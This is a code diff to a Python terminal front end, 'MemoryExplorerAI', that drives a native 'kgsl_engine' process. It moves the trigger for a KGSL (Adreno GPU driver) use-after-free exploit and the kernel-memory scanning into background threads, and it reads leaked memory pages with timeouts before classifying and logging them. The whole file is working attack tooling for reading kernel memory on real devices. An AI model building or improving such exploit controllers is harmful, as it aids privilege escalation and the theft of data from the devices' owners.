@@ -80,6 +80,10 @@ class MemoryExplorerAI:
         # Render lock — auto-render thread and input thread share the TUI
         self.render_lock = threading.Lock()
 
+        # Per-op busy flags (so TUI shows "EXPLOITING…" / "SCANNING…")
+        self.op_busy = {"exploit": False, "scan": False}
+        self.op_results = {"exploit": None, "scan": None}
+
         base_dir = os.path.dirname(os.path.abspath(__file__))
         self.engine_path = os.path.join(base_dir, "kgsl_engine")
 
@@ -203,7 +207,13 @@ class MemoryExplorerAI:
             now = time.time()
             self.live["ram"] = self.get_ram_usage()
             self.live["ai_patterns"] = self.knowledge_base.get("hit_count", 0)
-            if self.exploit_proc and self.exploit_proc.poll() is None:
+
+            # Status reflects engine + per-op busy state
+            if self.op_busy.get("exploit"):
+                self.live["status"] = "EXPLOITING…"
+            elif self.op_busy.get("scan"):
+                self.live["status"] = "SCANNING…"
+            elif self.exploit_proc and self.exploit_proc.poll() is None:
                 self.live["status"] = "EXPLOIT ACTIVE"
                 self.live["engine_pid"] = self.exploit_proc.pid
             else:
@@ -411,17 +421,30 @@ class MemoryExplorerAI:
         return False
 
     def _read_data_packet(self):
-        if not self.ensure_engine():
+        if not self._engine_alive():
             return None
         try:
-            line = self.exploit_proc.stdout.readline().decode().strip()
-            if not line.startswith("DATA:"):
+            # Wait briefly for the DATA: line
+            line = self._readline_timeout(timeout=2.0)
+            if not line or not line.startswith("DATA:"):
                 return None
             _, va_s, size_s = line.split(":")
             va = int(va_s, 16)
             size = int(size_s)
-            data = self.exploit_proc.stdout.read(size)
-            self.exploit_proc.stdout.readline()  # DATA_END
+            # Read raw bytes
+            data = b""
+            while len(data) < size:
+                if not self._engine_alive():
+                    return None
+                r, _, _ = select.select([self.exploit_proc.stdout], [], [], 2.0)
+                if not r:
+                    break
+                chunk = self.exploit_proc.stdout.read(size - len(data))
+                if not chunk:
+                    break
+                data += chunk
+            # Consume DATA_END line
+            self._readline_timeout(timeout=0.5)
             return data
         except Exception as e:
             self.live["last_msg"] = f"Read packet error: {e}"
@@ -487,20 +510,69 @@ class MemoryExplorerAI:
         except Exception:
             pass
 
+    def _readline_timeout(self, timeout=2.0):
+        """Non-blocking-ish read of one line from the engine (with select timeout).
+        Returns:
+            ""  -> timeout (no data available)
+            None -> engine died / EOF
+            str  -> the line read (already stripped)"""
+        if not self.exploit_proc or self.exploit_proc.poll() is not None:
+            return None
+        try:
+            fd = self.exploit_proc.stdout.fileno()
+            r, _, _ = select.select([fd], [], [], timeout)
+            if not r:
+                return ""
+            line = self.exploit_proc.stdout.readline()
+            if not line:
+                return None
+            return line.decode(errors="ignore").strip()
+        except Exception:
+            return None
+
     # ============== ACTIONS ==============
     def trigger_exploit(self):
+        """Trigger the KGSL UAF in a worker thread so the TUI never freezes.
+        The worker uses a bounded readline timeout so we always make progress."""
         self.live["last_command"] = "E (Exploit)"
+        if self.op_busy["exploit"]:
+            self.live["last_msg"] = "Exploit already running…"
+            return "Busy"
         if not self._engine_write(b"exploit\n"):
             return "Engine Error"
-        try:
-            line = self.exploit_proc.stdout.readline().decode().strip()
-            time.sleep(0.3)
-            self.live["last_msg"] = f"Exploit: {line or 'No response'}"
-            self.log_event("exploit", {"result": line})
-            return line or "No response"
-        except Exception as e:
-            self.live["last_msg"] = f"Exploit read error: {e}"
-            return f"Error: {e}"
+
+        self.op_busy["exploit"] = True
+        self.live["last_msg"] = "EXPLOITING…"
+
+        def _worker():
+            try:
+                # Poll the engine for a "UAF_READY" / "UAF_FAILED" line
+                # with bounded timeout, so we never block forever.
+                deadline = time.time() + 30  # 30s max
+                last_line = ""
+                while time.time() < deadline:
+                    line = self._readline_timeout(timeout=0.5)
+                    if line is None:
+                        self.op_results["exploit"] = "Engine died during exploit"
+                        break
+                    if not line:
+                        continue
+                    last_line = line
+                    if "UAF_READY" in line or "UAF_FAILED" in line:
+                        self.op_results["exploit"] = line
+                        break
+                else:
+                    self.op_results["exploit"] = f"Exploit timeout: {last_line or 'no response'}"
+            except Exception as e:
+                self.op_results["exploit"] = f"Error: {e}"
+            finally:
+                self.op_busy["exploit"] = False
+                result = self.op_results["exploit"] or "No response"
+                self.live["last_msg"] = f"Exploit: {result}"
+                self.log_event("exploit", {"result": result})
+
+        threading.Thread(target=_worker, daemon=True).start()
+        return "Exploit started"
 
     def cmd_clear(self):
         self.live["last_command"] = "C (Clear)"
@@ -540,42 +612,75 @@ class MemoryExplorerAI:
     def cmd_scan(self):
         """Synchronous scan, but with live progress bar updates."""
         self.live["last_command"] = "S (Scan)"
+        if self.op_busy["scan"]:
+            self.live["last_msg"] = "Scan already running…"
+            return "Busy"
         if not self.ensure_engine():
             return "Engine Error"
-        # Prioritize known ranges
-        for va_hex in list(self.knowledge_base["successful_vas"])[:8]:
-            va = int(va_hex, 16)
-            data = self.read_page(va)
-            if data and not any(int(it['va'], 16) == va for it in self.found_items):
-                self.found_items.append(self.classify_page(data, va))
 
+        self.op_busy["scan"] = True
         self.live["scan_total"] = self.scan_size
         self.live["scan_offset"] = 0
-        if not self._engine_write(
-            f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
-            self.live["last_msg"] = "Scan: engine write failed"
-            return "Error: engine write failed"
-        try:
-            while True:
-                line = self.exploit_proc.stdout.readline().decode().strip()
-                if not line:
-                    break
-                if "SCAN_DONE" in line:
-                    break
-                if "MATCH:" in line:
-                    va = int(line.split(":")[1], 16)
-                    self.live["scan_offset"] = va - self.uaf_start
-                    data = self._read_data_packet()
+        self.live["last_msg"] = "SCANNING…"
+
+        def _scan_worker():
+            try:
+                # Prioritize known ranges (these are quick page reads)
+                for va_hex in list(self.knowledge_base["successful_vas"])[:8]:
+                    if self.cancel_flag.is_set():
+                        return
+                    va = int(va_hex, 16)
+                    data = self.read_page(va)
                     if data and not any(int(it['va'], 16) == va for it in self.found_items):
-                        self.found_items.append(self.classify_page(data, va))
-                        self.log_event("scan_match", {"va": va, "type": self.found_items[-1]['type']})
-            self.live["scan_offset"] = self.scan_size
-            self.live["last_msg"] = f"Scan complete. Found {len(self.found_items)} items."
-            return f"Found {len(self.found_items)} items."
-        except Exception as e:
-            self.live["last_msg"] = f"Scan error: {e}"
-            self.log_event("scan_error", {"err": str(e)})
-            return f"Error: {e}"
+                        with self.bg_lock:
+                            self.found_items.append(self.classify_page(data, va))
+
+                if not self._engine_write(
+                    f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
+                    self.live["last_msg"] = "Scan: engine write failed"
+                    return
+
+                # Use bounded readline timeouts so we never block forever
+                deadline = time.time() + 600  # 10 min max
+                while time.time() < deadline:
+                    line = self._readline_timeout(timeout=1.0)
+                    if line is None:
+                        self.live["last_msg"] = "Scan: engine died"
+                        return
+                    if not line:
+                        continue
+                    if "SCAN_DONE" in line:
+                        break
+                    if "PROGRESS:" in line:
+                        try:
+                            parts = line.split(":")
+                            self.live["scan_offset"] = int(parts[1], 16)
+                        except Exception:
+                            pass
+                        continue
+                    if "MATCH:" in line:
+                        try:
+                            va = int(line.split(":")[1], 16)
+                        except Exception:
+                            continue
+                        self.live["scan_offset"] = va - self.uaf_start
+                        data = self._read_data_packet()
+                        if data and not any(int(it['va'], 16) == va for it in self.found_items):
+                            with self.bg_lock:
+                                self.found_items.append(self.classify_page(data, va))
+                            self.log_event("scan_match", {"va": va,
+                                                           "type": self.found_items[-1]['type']})
+
+                self.live["scan_offset"] = self.scan_size
+                self.live["last_msg"] = f"Scan complete. Found {len(self.found_items)} items."
+            except Exception as e:
+                self.live["last_msg"] = f"Scan error: {e}"
+                self.log_event("scan_error", {"err": str(e)})
+            finally:
+                self.op_busy["scan"] = False
+
+        threading.Thread(target=_scan_worker, daemon=True).start()
+        return "Scan started"
 
     # ============== BACKGROUND LEARNING (Ctrl+P to cancel) ==============
     def cmd_learning_start(self):
@@ -647,14 +752,25 @@ class MemoryExplorerAI:
             try:
                 scan_done = False
                 while not scan_done and not self.cancel_flag.is_set():
-                    line = self.exploit_proc.stdout.readline().decode().strip()
-                    if not line:
+                    line = self._readline_timeout(timeout=1.0)
+                    if line is None:
                         break
+                    if not line:
+                        continue
                     if "SCAN_DONE" in line:
                         scan_done = True
                         break
+                    if "PROGRESS:" in line:
+                        try:
+                            self.live["scan_offset"] = int(line.split(":")[1], 16)
+                        except Exception:
+                            pass
+                        continue
                     if "MATCH:" in line:
-                        va = int(line.split(":")[1], 16)
+                        try:
+                            va = int(line.split(":")[1], 16)
+                        except Exception:
+                            continue
                         self.live["scan_offset"] = va - self.uaf_start
                         data = self._read_data_packet()
                         if data and not any(int(it['va'], 16) == va for it in self.found_items):
